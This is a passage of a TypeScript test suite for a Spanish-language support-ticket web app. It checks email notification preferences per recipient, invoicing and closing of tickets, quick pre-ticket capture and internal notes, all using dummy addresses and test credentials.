    const gen = await adm.agent.post('/app/configuracion/correo-entrante/clave').type('form').send({ _csrf: adm.csrf });
    expect(gen.status).toBe(200);
    const clave = t.configuracionRepo.correoEntrante.webhookKey;
    expect(clave).not.toBe('');
    expect(gen.text).toContain(`/webhooks/correo-entrante?key=${clave}`);
    const ok = await request(t.app).post(`/webhooks/correo-entrante?key=${encodeURIComponent(clave)}`).send(correo);
    expect(ok.body).toMatchObject({ ok: true, accion: 'solicitud' });

    const rem = await adm.agent.post('/app/configuracion/correo-entrante/remitente').type('form')
      .send({ _csrf: adm.csrf, remitenteEmail: 'servicio@dattasoft.mx', remitenteNombre: 'Soporte DATTASOFT' });
    expect(rem.text).toContain('Remitente guardado');
    expect(t.configuracionRepo.correoEntrante.remitenteEmail).toBe('servicio@dattasoft.mx');
  });

  it('responder desde el ticket: con copia, captura y asunto [Ticket #N]', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const sup = await login(t.app, SUP.email, SUP.password);
    const crear = await sup.agent.post('/app/tickets').type('form').send({
      _csrf: sup.csrf, asunto: 'Pantalla en blanco', descripcion: 'descripción larga', tipo: 'General', prioridad: 'Baja',
      contactoNombre: 'Luis', contactoCorreo: 'luis@cliente.mx',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    t.emailSender.enviados.length = 0;
    const img = Buffer.from('png-falso').toString('base64');
    await sup.agent.post(`/app/tickets/${id}/nota`).type('form').send({
      _csrf: sup.csrf, cuerpo: 'Revisa la captura', ccRespuesta: 'jefe@cliente.mx, mal-correo',
      imagenesNota: JSON.stringify([{ nombre: 'cap.jpg', contentType: 'image/jpeg', base64: img }]),
    });
    const correo = t.emailSender.ultimo!;
    expect(correo.asunto).toBe('[Ticket #1] Pantalla en blanco');
    expect(correo.cc?.map((c) => c.email)).toContain('jefe@cliente.mx');
    expect(correo.html).toMatch(/\/adjunto\/[\w-]+/);
    const detalle = await sup.agent.get(`/app/tickets/${id}`);
    expect(detalle.text).toContain('chat__msg--equipo');
    expect(detalle.text).toMatch(/adjuntos\/[\w-]+" alt="Captura 1"/);
  });
});

describe('avisos de cerrado y facturado por persona (Configuración → Tickets)', () => {
  const ADMIN = { uid: 'u-adm', email: 'adm@dattasoft.mx', password: 'admin12345', nombre: 'Adm', rol: 'admin' as const };
  const destinatarios = (c: { para: { email: string }[]; cc?: { email: string }[]; cco?: { email: string }[] }): string[] =>
    [...c.para, ...(c.cc ?? []), ...(c.cco ?? [])].map((d) => d.email);

  it('se guardan desde el formulario y cada quien recibe solo lo que marcó', async () => {
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({ ...cfg, correosNotificacion: ['soporte@dattasoft.mx'] });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);

    // Sin guardar nunca, la tabla muestra la lista de notificación con las dos casillas.
    const vista = await agent.get('/app/configuracion/tickets');
    expect(vista.text).toContain('name="avisoCorreo" value="soporte@dattasoft.mx"');

    const guardar = await agent.post('/app/configuracion/tickets').type('form').send({
      _csrf: csrf,
      tipos: cfg.tipos.join('\n'),
      sistemas: cfg.sistemas.join('\n'),
      grupos: cfg.grupos.join('\n'),
      estados: cfg.estados.join('\n'),
      prioridades: cfg.prioridades.join('\n'),
      tiposFacturables: '',
      estadoInicial: cfg.estadoInicial,
      correosNotificacion: 'soporte@dattasoft.mx',
      avisosEnviado: '1',
      avisoCorreo: ['soporte@dattasoft.mx', 'factura@dattasoft.mx', 'gerente@dattasoft.mx', '', 'FACTURA@dattasoft.mx'],
      avisoCerrado: ['1', '0', '0', '1', '1'],
      avisoFacturado: ['0', '1', '0', '1', '1'],
    });
    expect(guardar.status).toBe(200);
    expect((await t.configuracionRepo.obtenerTickets()).avisosCierre).toEqual([
      { correo: 'soporte@dattasoft.mx', cerrado: true, facturado: false },
      { correo: 'factura@dattasoft.mx', cerrado: false, facturado: true },
      { correo: 'gerente@dattasoft.mx', cerrado: false, facturado: false },
    ]);

    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Por persona', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });

    const cierre = t.emailSender.enviados.find((c) => c.tags?.includes('ticket-cerrado'));
    const facturado = t.emailSender.enviados.find((c) => c.asunto.includes('FACTURADO'));
    expect(destinatarios(cierre!)).toContain('soporte@dattasoft.mx');
    expect(destinatarios(cierre!)).not.toContain('factura@dattasoft.mx');
    expect(destinatarios(cierre!)).not.toContain('gerente@dattasoft.mx');
    expect(destinatarios(facturado!)).toEqual(['factura@dattasoft.mx']);
  });

  it('🆕 ticket nuevo y 💬 respuestas también por persona: facturas solo 💲, soporte todo', async () => {
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({ ...cfg, correosNotificacion: ['soporte@dattasoft.mx', 'factura@dattasoft.mx'] });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);

    // Antes de guardar, la tabla muestra a los dos con 🆕 y 💬 marcados (como funciona hoy).
    const vista = await agent.get('/app/configuracion/tickets');
    expect(vista.text).toContain('name="avisoNuevo" value="1"');
    expect(vista.text).toContain('📈 Avances');

    await agent.post('/app/configuracion/tickets').type('form').send({
      _csrf: csrf,
      tipos: cfg.tipos.join('\n'), sistemas: cfg.sistemas.join('\n'), grupos: cfg.grupos.join('\n'),
      estados: cfg.estados.join('\n'), prioridades: cfg.prioridades.join('\n'), tiposFacturables: '',
      estadoInicial: cfg.estadoInicial, correosNotificacion: 'soporte@dattasoft.mx\nfactura@dattasoft.mx',
      avisosEnviado: '1',
      avisoCorreo: ['soporte@dattasoft.mx', 'factura@dattasoft.mx'],
      avisoNuevo: ['1', '0'],
      avisoRespuestas: ['1', '0'],
      avisoCerrado: ['1', '0'],
      avisoFacturado: ['1', '1'],
    });

    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Filtro por persona', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
      contactoCorreo: 'cliente@empresa.mx', enviarCorreo: 'on',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    const alCrear = t.emailSender.enviados.flatMap(destinatarios);
    expect(alCrear).toContain('soporte@dattasoft.mx');
    expect(alCrear).not.toContain('factura@dattasoft.mx');

    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Ya quedó, revise por favor' });
    const respuesta = t.emailSender.enviados.flatMap(destinatarios);
    expect(respuesta).toContain('cliente@empresa.mx');
    expect(respuesta).toContain('soporte@dattasoft.mx');
    expect(respuesta).not.toContain('factura@dattasoft.mx');

    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    const facturado = t.emailSender.enviados.find((c) => c.asunto.includes('FACTURADO'));
    expect(destinatarios(facturado!)).toContain('factura@dattasoft.mx');
    const cierre = t.emailSender.enviados.find((c) => c.tags?.includes('ticket-cerrado'));
    expect(destinatarios(cierre!)).not.toContain('factura@dattasoft.mx');
  });

  it('📈 avances va aparte de 💬 respuestas; la página tras guardar trae los contadores del menú', async () => {
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({ ...cfg, correosNotificacion: ['soporte@dattasoft.mx'], avisarClienteEstados: ['En proceso'] });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);
    // Una fila guardada antes de existir la columna: «avances» sigue a «respuestas».
    await t.configuracionRepo.guardarTickets({
      ...(await t.configuracionRepo.obtenerTickets()),
      avisosCierre: [{ correo: 'soporte@dattasoft.mx', cerrado: true, facturado: true, nuevo: true, respuestas: true }],
    });
    expect((await agent.get('/app/configuracion/tickets')).text).toContain('name="avisoAvances" value="1"');

    const guardar = await agent.post('/app/configuracion/tickets').type('form').send({
      _csrf: csrf,
      tipos: cfg.tipos.join('\n'), sistemas: cfg.sistemas.join('\n'), grupos: cfg.grupos.join('\n'),
      estados: cfg.estados.join('\n'), prioridades: cfg.prioridades.join('\n'), tiposFacturables: '',
      estadoInicial: cfg.estadoInicial, correosNotificacion: 'soporte@dattasoft.mx', avisarClienteEstados: 'En proceso',
      avisosEnviado: '1', avisoCorreo: ['soporte@dattasoft.mx'],
      avisoNuevo: ['1'], avisoRespuestas: ['1'], avisoAvances: ['0'], avisoCerrado: ['1'], avisoFacturado: ['1'],
    });
    expect(guardar.status).toBe(200);
    // Contadores del menú y campana también en la página que sale después de guardar.
    expect(guardar.text).toContain('data-campana-respuestas');
    expect(guardar.text).toContain('sidebar__badge--total');

    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Avances aparte', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
      contactoCorreo: 'cliente@empresa.mx',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'En proceso' });
    const avance = t.emailSender.enviados.flatMap(destinatarios);
    expect(avance).toContain('cliente@empresa.mx');
    expect(avance).not.toContain('soporte@dattasoft.mx');
    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Seguimos revisando' });
    expect(t.emailSender.enviados.flatMap(destinatarios)).toContain('soporte@dattasoft.mx');
  });

  it('👤 CLIENTE: se le pueden apagar ticket nuevo, avances y cerrado; las respuestas siempre le llegan', async () => {
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({ ...cfg, correosNotificacion: ['soporte@dattasoft.mx'] });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);
    expect((await agent.get('/app/configuracion/tickets')).text).toContain('👤 CLIENTE');

    await agent.post('/app/configuracion/tickets').type('form').send({
      _csrf: csrf,
      tipos: cfg.tipos.join('\n'), sistemas: cfg.sistemas.join('\n'), grupos: cfg.grupos.join('\n'),
      estados: cfg.estados.join('\n'), prioridades: cfg.prioridades.join('\n'), tiposFacturables: '',
      estadoInicial: cfg.estadoInicial, correosNotificacion: 'soporte@dattasoft.mx', avisarClienteEstados: 'En proceso',
      clienteEnviado: '1', clienteNuevo: '0', clienteAvances: '0', clienteCerrado: '0',
      avisosEnviado: '1', avisoCorreo: ['soporte@dattasoft.mx'],
      avisoNuevo: ['1'], avisoRespuestas: ['1'], avisoAvances: ['1'], avisoCerrado: ['1'], avisoFacturado: ['1'],
    });
    expect((await t.configuracionRepo.obtenerTickets()).avisosCliente).toEqual({ nuevo: false, avances: false, cerrado: false });

    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Cliente callado', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
      contactoCorreo: 'cliente@empresa.mx', enviarCorreo: 'on',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    const alCrear = t.emailSender.enviados.flatMap(destinatarios);
    expect(alCrear).toContain('soporte@dattasoft.mx');
    expect(alCrear).not.toContain('cliente@empresa.mx');

    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'En proceso' });
    expect(t.emailSender.enviados.flatMap(destinatarios)).not.toContain('cliente@empresa.mx');

    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Le escribimos directo' });
    expect(t.emailSender.enviados.flatMap(destinatarios)).toContain('cliente@empresa.mx');

    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado', facturarCon: '' });
    const cierre = t.emailSender.enviados.flatMap(destinatarios);
    expect(cierre).toContain('soporte@dattasoft.mx');
    expect(cierre).not.toContain('cliente@empresa.mx');
  });

  it('el agente que cierra (o el asignado) respeta su casilla ✔️ Cerrado si está en la tabla', async () => {
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({
      ...cfg,
      correosNotificacion: [ADMIN.email],
      avisosCierre: [{ correo: ADMIN.email, cerrado: false, facturado: false, nuevo: true, respuestas: true }],
    });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Cierre sin copia', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
      contactoCorreo: 'cliente@empresa.mx',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado', facturarCon: '' });
    const cierre = t.emailSender.enviados.flatMap(destinatarios);
    expect(cierre).toContain('cliente@empresa.mx');
    expect(cierre).not.toContain(ADMIN.email);
  });

  it('un correo inválido no se guarda y avisa', async () => {
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);
    const r = await agent.post('/app/configuracion/tickets').type('form').send({
      _csrf: csrf,
      tipos: cfg.tipos.join('\n'), sistemas: cfg.sistemas.join('\n'), grupos: cfg.grupos.join('\n'),
      estados: cfg.estados.join('\n'), prioridades: cfg.prioridades.join('\n'), tiposFacturables: '',
      estadoInicial: cfg.estadoInicial, correosNotificacion: '',
      avisosEnviado: '1', avisoCorreo: 'gaby sin arroba', avisoCerrado: '1', avisoFacturado: '1',
    });
    expect(r.status).toBe(422);
    expect(r.text).toContain('no es un correo válido');
    expect((await t.configuracionRepo.obtenerTickets()).avisosCierre).toBeUndefined();
  });
});

describe('facturar y cerrar en un paso', () => {
  const nuevo = async (agent: request.Agent, csrf: string): Promise<string> => {
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Facturar y cerrar', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    return String(crear.headers.location).split('/').pop()!;
  };

  it('el formulario trae el aviso solo con el ticket abierto', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    expect((await agent.get(`/app/tickets/${id}`)).text).toMatch(/data-facturar-cerrar="Cerrado" data-facturar-original="[a-z_]+" data-puede-cerrar/);
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect((await agent.get(`/app/tickets/${id}`)).text).not.toContain('data-facturar-cerrar');
  });

  it('✏️ Editar también trae el aviso mientras el ticket esté abierto', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    const editar = await agent.get(`/app/tickets/${id}/editar`);
    expect(editar.text).toMatch(/data-facturar-cerrar="Cerrado" data-facturar-campo="estadoFacturacion"/);
    expect(editar.text).toContain('data-puede-cerrar');
  });

  it('«Facturar y cerrar» deja el ticket cerrado y facturado, con un solo aviso [FACTURADO]', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    t.configuracionRepo.config = { ...t.configuracionRepo.config, correosNotificacion: ['soporte@dattasoft.mx'] };
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    const r = await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'factura_mensual', cerrarCon: 'Cerrado' });
    expect(r.status).toBe(302);
    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.esCerrado).toBe(true);
    expect(ticket.facturacion.estado).toBe('factura_mensual');
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
    expect(t.emailSender.enviados.some((c) => c.tags?.includes('ticket-cerrado'))).toBe(true);

    // Reenviar lo mismo (doble clic) no truena ni repite avisos.
    const otra = await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'factura_mensual', cerrarCon: 'Cerrado' });
    expect(otra.status).toBe(302);
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
  });

  it('«Solo facturar» lo deja abierto y cerrarCon con un estado que no es de cierre se ignora', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado', cerrarCon: '' });
    expect(t.ticketStore.tickets.get(id)!.esCerrado).toBe(false);
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado', cerrarCon: 'Resuelto' });
    expect(t.ticketStore.tickets.get(id)!.estado).not.toBe('Resuelto');
  });
});

describe('«¿Ya se facturó?» al cerrar', () => {
  const nuevo = async (agent: request.Agent, csrf: string): Promise<string> => {
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Cerrar y facturar', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media', estadoFacturacion: 'no_facturado',
    });
    return String(crear.headers.location).split('/').pop()!;
  };

  it('las pantallas traen el aviso solo con el ticket en «No facturado»', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    const cobro = 'data-cerrar-cobro="facturado|Facturado;factura_mensual|Factura mensual"';
    expect((await agent.get(`/app/tickets/${id}`)).text).toContain(cobro);
    expect((await agent.get(`/app/tickets/${id}/editar`)).text).toContain(cobro);

    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'consulta_sin_costo' });
    expect((await agent.get(`/app/tickets/${id}`)).text).not.toMatch(/action="\/app\/tickets\/[^"]+\/estado" class="card form" data-cerrar-cobro/);
  });

  it('cerrar con facturarCon factura y cierra, con un solo [FACTURADO]', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    t.configuracionRepo.config = { ...t.configuracionRepo.config, correosNotificacion: ['soporte@dattasoft.mx'] };
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    const r = await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado', facturarCon: 'facturado' });
    expect(r.status).toBe(302);
    const tk = t.ticketStore.tickets.get(id)!;
    expect(tk.esCerrado).toBe(true);
    expect(tk.facturacion.estado).toBe('facturado');
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
  });

  it('«Cerrar sin facturar» y facturarCon con un estado que no es de cierre no tocan la facturación', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const id = await nuevo(agent, csrf);
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Pendiente', facturarCon: 'facturado' });
    expect(t.ticketStore.tickets.get(id)!.facturacion.estado).toBe('no_facturado');
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado', facturarCon: '' });
    const tk = t.ticketStore.tickets.get(id)!;
    expect(tk.esCerrado).toBe(true);
    expect(tk.facturacion.estado).toBe('no_facturado');
  });
});

describe('⚡ captura rápida', () => {
  it('pegar notas → revisar → crear pre-tickets con su fecha, agente y estado; Editar los confirma', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    t.empresaRepo.items.set('e1', new Empresa({ id: 'e1', nombre: 'CANUL Y ASOCIADOS' }));
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);

    const vista = await agent.get('/app/tickets/captura');
    expect(vista.status).toBe(200);
    const rev = await agent.post('/app/tickets/captura').type('form').send({
      _csrf: csrf,
      texto: 'CANUL Y ASOCIADOS - AGENTE 28/10/2026\n\nNo abre la contabilidad\n\nEMPRESA NUEVA - 27/10/2026\nOtra cosa que revisar',
      tipo: 'General',
    });
    expect(rev.status).toBe(200);
    expect(rev.text).toContain('data-captura-fila');
    expect(rev.text).toContain('value="CANUL Y ASOCIADOS"');
    expect(rev.text).toContain('captura-falta');
    expect(t.ticketStore.tickets.size).toBe(0);

    const r = await agent
      .post('/app/tickets/captura/crear')
      .set('x-csrf-token', csrf)
      .send({
        tipo: 'General', empresaNombre: 'CANUL Y ASOCIADOS', asunto: 'No abre la contabilidad',
        descripcion: 'CANUL Y ASOCIADOS - AGENTE 28/10/2026\n\nNo abre la contabilidad', fecha: '2026-10-28',
        agenteUid: AG.uid, estado: 'Resuelto', enviarCorreo: false,
      });
    expect(r.body).toMatchObject({ ok: true, correo: false });
    const tk = t.ticketStore.tickets.get(r.body.id)!;
    expect(tk).toMatchObject({ estado: 'Resuelto', empresaId: 'e1', agenteAsignadoUid: AG.uid, preTicket: true });
    expect(tk.createdAt.toISOString()).toBe('2026-10-28T18:00:00.000Z');
    expect(tk.resueltoEn).not.toBeNull();
    expect(t.emailSender.enviados).toHaveLength(0);

    const lista = await agent.get('/app/tickets?pre=1');
    expect(lista.text).toContain('📝 Pre-ticket');

    const mal = await agent.post('/app/tickets/captura/crear').set('x-csrf-token', csrf).send({ tipo: 'General', asunto: 'x' });
    expect(mal.status).toBe(422);

    await agent.post(`/app/tickets/${tk.id}/editar`).type('form').send({
      _csrf: csrf, asunto: tk.asunto, descripcion: 'No abre la contabilidad', tipo: 'General', prioridad: 'Media',
      empresaNombre: 'CANUL Y ASOCIADOS',
    });
    expect(t.ticketStore.tickets.get(tk.id)!.preTicket).toBe(false);
  });

  it('la descripción del pre-ticket lleva la firma del agente (o la de quien captura si no hay agente)', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    (await t.usuarioRepo.findByUid(AG.uid))!.fijarFirma('Ing. Agente\nSoporte DATTASOFT', new Date());
    (await t.usuarioRepo.findByUid(SUP.uid))!.fijarFirma('<p><b>Sup</b> — Supervisión</p>', new Date());
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = (extra: object) =>
      agent.post('/app/tickets/captura/crear').set('x-csrf-token', csrf).send({
        tipo: 'General', asunto: 'Revisar timbrado', descripcion: 'EMPRESA X\nRevisar timbrado', estado: 'Resuelto', ...extra,
      });

    const conAgente = await crear({ agenteUid: AG.uid });
    const d1 = t.ticketStore.tickets.get(conAgente.body.id)!.descripcion;
    expect(d1).toContain('Revisar timbrado');
    expect(d1).toContain('Ing. Agente<br>Soporte DATTASOFT');
    expect(d1.indexOf('Ing. Agente')).toBeGreaterThan(d1.indexOf('Revisar timbrado'));

    const sinAgente = await crear({ agenteUid: '' });
    expect(t.ticketStore.tickets.get(sinAgente.body.id)!.descripcion).toContain('<b>Sup</b> — Supervisión');
  });

  it('el agente por defecto es quien inició sesión (también al llegar desde 🗒️ Mis notas); «Sin asignar» se respeta', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const yo = new RegExp(`<option value="${SUP.uid}" selected>`);

    const vista = await agent.get('/app/tickets/captura');
    expect(vista.text).toMatch(yo);

    // Desde Mis notas el formulario solo trae el texto: cada fila queda con quien inició sesión.
    const desdeNotas = await agent.post('/app/tickets/captura').type('form').send({ _csrf: csrf, texto: 'EMPRESA X - 27/10/2026\nRevisar timbrado' });
    expect(desdeNotas.status).toBe(200);
    expect(desdeNotas.text.match(new RegExp(yo, 'g'))?.length).toBeGreaterThanOrEqual(2);

    const sinAsignar = await agent.post('/app/tickets/captura').type('form').send({ _csrf: csrf, texto: 'EMPRESA X - 27/10/2026\nRevisar timbrado', agenteUid: '' });
    expect(sinAsignar.text).not.toMatch(yo);
  });
});

describe('detalle del ticket: respuesta al cliente y notas internas separadas', () => {
  it('trae los dos recuadros con su encabezado; la nota interna se guarda como interna y no manda correo', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const c = await agent.post('/app/tickets/captura/crear').set('x-csrf-token', csrf)
      .send({ tipo: 'General', asunto: 'Revisar timbrado', estado: 'Abierto', contactoCorreo: 'cliente@empresa.mx' });
    const det = await agent.get(`/app/tickets/${c.body.id}`);
    expect(det.text).toContain('💬 Respuesta al cliente');
    expect(det.text).toContain('🔒 Notas internas');
    expect(det.text).toContain('name="tipo" value="interna"');

    const enviados = t.emailSender.enviados.length;
    await agent.post(`/app/tickets/${c.body.id}/nota`).type('form').send({ _csrf: csrf, tipo: 'interna', cuerpo: 'Factura MID 1574' });
    const notas = t.ticketStore.notas.get(c.body.id) ?? [];
    expect(notas.find((n) => n.cuerpo.includes('MID 1574'))?.tipo).toBe('interna');
    expect(t.emailSender.enviados.length).toBe(enviados);
  });
});

describe('detalle del ticket sin «Gestión»', () => {
  it('ya no trae el recuadro Gestión; la nota interna de antes se ve como nota (sin repetir la migrada)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const c = await agent.post('/app/tickets/captura/crear').set('x-csrf-token', csrf)
      .send({ tipo: 'General', asunto: 'Revisar timbrado', estado: 'Abierto', solicitadoPor: 'Auxiliar Pedro' });
    const tk = t.ticketStore.tickets.get(c.body.id)!;
    tk.notasInternas = 'Factura MID 1574';

    let det = await agent.get(`/app/tickets/${c.body.id}`);
    expect(det.text).not.toContain('Guardar gestión');
    expect(det.text).toContain('Solicitado por:');
    expect(det.text).toContain('Nota interna anterior');
    expect(det.text).toContain('Factura MID 1574');

    // Si ya está en la conversación (como la trae la migración), no se repite.
    await agent.post(`/app/tickets/${c.body.id}/nota`).type('form').send({ _csrf: csrf, tipo: 'interna', cuerpo: 'Factura MID 1574' });
    det = await agent.get(`/app/tickets/${c.body.id}`);
    expect(det.text).not.toContain('Nota interna anterior');

    const form = await agent.get(`/app/tickets/${c.body.id}/editar`);
    expect(form.text).not.toContain('name="notasInternas"');
  });
});

describe('notas internas aparte de la conversación', () => {
  it('la nota interna sale en su recuadro amarillo y no en la plática con el cliente', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const c = await agent.post('/app/tickets/captura/crear').set('x-csrf-token', csrf).send({ tipo: 'General', asunto: 'Revisar timbrado', estado: 'Abierto' });
    await agent.post(`/app/tickets/${c.body.id}/nota`).type('form').send({ _csrf: csrf, tipo: 'interna', cuerpo: 'Folio SER 4115' });
    const det = (await agent.get(`/app/tickets/${c.body.id}`)).text;
    const hilo = det.slice(det.indexOf('data-chat-hilo'), det.indexOf('chat__escribir-grid'));
    const recuadro = det.slice(det.indexOf('notas-internas__lista'), det.indexOf('notas-internas__form'));
    expect(hilo).not.toContain('Folio SER 4115');
    expect(hilo).toContain('Sin respuestas todavía');
    expect(recuadro).toContain('Folio SER 4115');
  });
});

describe('🧾 folio de factura', () => {
  it('se guarda sin mandar correo; con «Mandárselo al cliente» sale uno solo al cliente; va en el [FACTURADO] y en el cierre', async () => {
    const ADMIN = { uid: 'u-adm2', email: 'adm2@dattasoft.mx', password: 'admin12345', nombre: 'Adm', rol: 'admin' as const };
    const t = makeTestApp({ usuarios: [ADMIN] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({
      ...cfg,
      correosNotificacion: ['soporte@dattasoft.mx'],
      avisosCierre: [{ correo: 'soporte@dattasoft.mx', cerrado: true, facturado: true, nuevo: true, respuestas: true }],
    });
    const { agent, csrf } = await login(t.app, ADMIN.email, ADMIN.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Con factura', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
      contactoCorreo: 'cliente@empresa.mx',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado', folioFactura: 'SER 1445' });
    expect(t.ticketStore.tickets.get(id)!.facturacion.folio).toBe('SER 1445');
    expect(t.emailSender.enviados).toHaveLength(0);
    const det = await agent.get(`/app/tickets/${id}`);
    expect(det.text).toContain('🧾 <strong>SER 1445</strong>');
    expect((await agent.get('/app/tickets')).text).toContain('🧾 SER 1445');

    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado', folioFactura: 'SER 1445', avisarFolio: 'on' });
    expect(t.emailSender.enviados).toHaveLength(1);
    const alCliente = t.emailSender.enviados[0]!;
    expect(alCliente.para.map((p) => p.email)).toEqual(['cliente@empresa.mx']);
    expect(alCliente.cc ?? []).toEqual([]);
    expect(alCliente.html).toContain('SER 1445');

    t.emailSender.enviados.length = 0;
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(t.emailSender.enviados.find((c) => c.asunto.includes('[FACTURADO SER 1445]'))).toBeTruthy();
